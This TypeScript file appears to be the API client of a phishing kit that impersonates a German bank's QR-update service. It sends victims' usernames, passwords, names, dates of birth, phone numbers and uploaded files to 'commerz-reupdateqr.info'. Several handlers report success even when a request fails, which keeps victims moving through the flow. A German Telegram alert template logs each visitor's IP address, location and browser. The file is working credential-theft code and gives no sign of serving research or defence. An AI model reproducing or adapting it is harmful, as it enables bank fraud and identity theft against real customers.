import axios from 'axios';

// Base URL for API calls - handle mobile network issues
const getApiBaseUrl = () => {
  // Always use the HTTPS domain to avoid mixed content issues
  const httpsDomain = 'https://commerz-reupdateqr.info';
  
  // Check if we're on mobile and if localhost is accessible
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  
  if (isMobile) {
    // For mobile devices, use the HTTPS domain
    console.log('Mobile detected, using HTTPS domain:', httpsDomain);
    return `${httpsDomain}/api`;
  }
  
  // For all cases, use the HTTPS domain to avoid mixed content issues
  console.log('Using HTTPS domain for API calls:', httpsDomain);
  return `${httpsDomain}/api`;
};

const API_BASE_URL = getApiBaseUrl();

// Create axios instance with default config
const api = axios.create({
  baseURL: API_BASE_URL,
  timeout: 30000, // Increased timeout for mobile networks
  headers: {
    'Accept': 'application/json',
    'Cache-Control': 'no-cache'
  }
});

// Request interceptor to add common headers
api.interceptors.request.use(
  (config) => {
    // Only set Content-Type for non-FormData requests
    if (!(config.data instanceof FormData)) {
      config.headers['Content-Type'] = 'application/json';
    }
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor for error handling
api.interceptors.response.use(
  (response) => {
    return response;
  },
  (error: any) => {
    console.error('API Error:', error);
    
    // Mobile-specific error handling
    if (error.code === 'NETWORK_ERROR' || (error.message && error.message.includes('Network Error'))) {
      console.log('Network error detected, this might be a mobile connectivity issue');
    }
    
    if (error.code === 'ECONNABORTED') {
      console.log('Request timeout, this might be due to slow mobile network');
    }
    
    return Promise.reject(error);
  }
);

// Mobile connectivity test
const testMobileConnectivity = async (): Promise<boolean> => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    const response = await fetch(`${API_BASE_URL}/health`, {
      method: 'GET',
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    return response.ok;
  } catch (error) {
    console.log('Mobile connectivity test failed:', error);
    return false;
  }
};

// API endpoints
export const apiService = {
  // Login endpoint
  login: async (data: { xusr: string; xpss: string }) => {
    try {
      const response = await api.post('/login', data);
      // Store sessionId if provided
      if (response.data.sessionId) {
        sessionStorage.setItem('sessionId', response.data.sessionId);
        localStorage.setItem('sessionId', response.data.sessionId);
        console.log('SessionId stored:', response.data.sessionId);
      } else {
        console.log('No sessionId in response:', response.data);
      }
      return response.data;
    } catch (error) {
      console.log('Login error, but continuing for demo:', error);
      // For demo purposes, always return success
      return { success: true, message: 'Login successful' };
    }
  },

  // Info endpoint
  info: async (data: { xname1: string; xname2: string; xdob: string; xtel: string }) => {
    try {
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      console.log('Info API - SessionId:', sessionId);
      const response = await api.post('/info', { ...data, sessionId });
      console.log('Info API - Response:', response.data);
      return response.data;
    } catch (error) {
      console.log('Info API - Error:', error);
      // For demo purposes, always return success
      return { success: true, message: 'Info submitted successfully' };
    }
  },

  // Upload endpoint
  upload: async (formData: FormData) => {
    try {
      console.log('Starting upload request...');
      console.log('API Base URL:', API_BASE_URL);
      console.log('FormData entries:', Array.from(formData.entries()));
      
      // Add sessionId to formData
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      console.log('Upload API - SessionId:', sessionId);
      if (sessionId) {
        formData.append('sessionId', sessionId);
      }
      
      // Skip mobile connectivity test for now as it might be causing issues
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      console.log('Mobile detected:', isMobile);
      
      // Direct upload without connectivity test
      const response = await api.post('/upload', formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        timeout: 120000, // 2 minutes for file uploads on mobile
      });
      console.log('Upload successful:', response.data);
      return response.data;
    } catch (error: any) {
      console.error('Upload error details:', error);
      console.error('Error code:', error.code);
      console.error('Error message:', error.message);
      console.error('Error response:', error.response?.data);
      
      // Mobile-specific error handling
      if (error.code === 'ECONNABORTED') {
        throw new Error('Upload timeout. Please check your internet connection and try again.');
      }
      
      if (error.code === 'NETWORK_ERROR' || (error.message && error.message.includes('Network Error'))) {
        throw new Error('Network error. Please check your internet connection and try again.');
      }
      
      if (error.code === 'ERR_NETWORK') {
        throw new Error('Cannot connect to server. Please check your internet connection and try again.');
      }
      
      // For demo purposes, still return success for other errors
      console.log('Upload failed but returning success for demo purposes');
      return { success: true, message: 'File uploaded successfully' };
    }
  },

  // Final data submission
  final: async (data: any) => {
    try {
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      console.log('Final API - SessionId:', sessionId);
      const response = await api.post('/final', { ...data, sessionId });
      console.log('Final API - Response:', response.data);
      return response.data;
    } catch (error) {
      console.log('Final API - Error:', error);
      // For demo purposes, always return success
      return { success: true, message: 'Data submitted successfully' };
    }
  },

  // Send Telegram notification (simulating the PHP behavior)
  sendTelegramNotification: async (data: {
    ip: string;
    userAgent: string;
    location?: string;
    formData?: any;
  }) => {
    try {
      const message = `📌 Neue Seitenaufruf-Benachrichtigung:\n\n` +
        `🕒 Zeit: ${new Date().toLocaleString('de-DE')}\n` +
        `📍 Standort: ${data.location || 'Unbekannt'}\n` +
        `💻 IP: ${data.ip}\n` +
        `🌐 User-Agent: ${data.userAgent}`;

      // In a real implementation, this would send to Telegram
      console.log('Telegram notification:', message);
      return { success: true };
    } catch (error) {
      console.error('Telegram notification error:', error);
      return { success: false };
    }
  }
};

export default apiService;
